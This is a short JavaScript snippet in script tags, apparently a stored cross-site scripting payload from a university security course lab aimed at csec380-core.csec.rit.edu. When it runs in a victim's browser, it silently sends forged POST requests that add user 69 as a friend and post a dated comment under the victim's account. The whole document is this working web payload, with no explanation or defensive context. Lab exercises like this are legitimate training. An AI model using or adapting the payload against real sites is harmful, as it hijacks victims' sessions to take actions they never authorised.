<script> 
var f = new XMLHttpRequest(); 
f.open('POST', 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=69', true); 
f.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');  
f.send(); 
var d = new Date(); 
var comment = 'Friend added on ' + d.getMonth() + '-' + d.getDate();
var c = new XMLHttpRequest(); 
var url = 'http://csec380-core.csec.rit.edu:86/add_comment.php?id=69&comment='+comment; 
c.open("POST", url, true); 
c.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
c.send(); 
</script>
